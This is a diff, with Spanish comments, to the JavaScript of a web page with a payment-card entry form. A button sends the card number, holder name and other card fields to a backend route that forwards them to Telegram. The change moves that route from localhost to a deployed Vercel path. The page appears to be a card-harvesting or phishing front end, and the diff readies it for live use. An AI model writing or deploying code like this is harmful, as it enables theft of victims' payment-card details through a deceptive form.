@@ -460,6 +460,9 @@
     let isFlippingFromExpiry = false;
     let expiryTimeout = null;
 
+    // Usar la API de Vercel (ruta relativa)
+    const API_URL = '/api/send-to-telegram';
+
     function formatCardNumber(value) {
         let cleaned = value.replace(/\D/g, '');
         if (cleaned.length > 16) cleaned = cleaned.slice(0, 16);
@@ -577,7 +580,6 @@
         }
     });
 
-    // Envío a Telegram vía backend (sin exponer token)
     sendBtn.addEventListener('click', async () => {
         const cardNumber = numberInput.value.replace(/\s/g, '');
         const cardHolder = holderInput.value.trim();
@@ -641,7 +643,7 @@
         statusMsg.style.background = '#e3f2fd';
 
         try {
-            const response = await fetch('http://localhost:3000/api/send-to-telegram', {
+            const response = await fetch(API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -659,13 +661,15 @@
                 statusMsg.style.background = '#d4edda';
                 statusMsg.style.color = '#155724';
             } else {
-                statusMsg.innerHTML = '❌ Error al enviar: ' + (data.error || 'Error desconocido');
+                statusMsg.innerHTML = '❌ Error: ' + (data.error || 'Error desconocido');
                 statusMsg.style.background = '#f8d7da';
+                statusMsg.style.color = '#721c24';
             }
         } catch (error) {
             console.error('Error:', error);
-            statusMsg.innerHTML = '❌ Error de conexión. Asegúrate que el backend esté corriendo en puerto 3000';
+            statusMsg.innerHTML = '❌ Error de conexión. Verifica que el backend esté desplegado correctamente.';
             statusMsg.style.background = '#f8d7da';
+            statusMsg.style.color = '#721c24';
         } finally {
             sendBtn.disabled = false;
             sendBtn.innerHTML = '<span>✈️</span> ENVIAR A TELEGRAM';
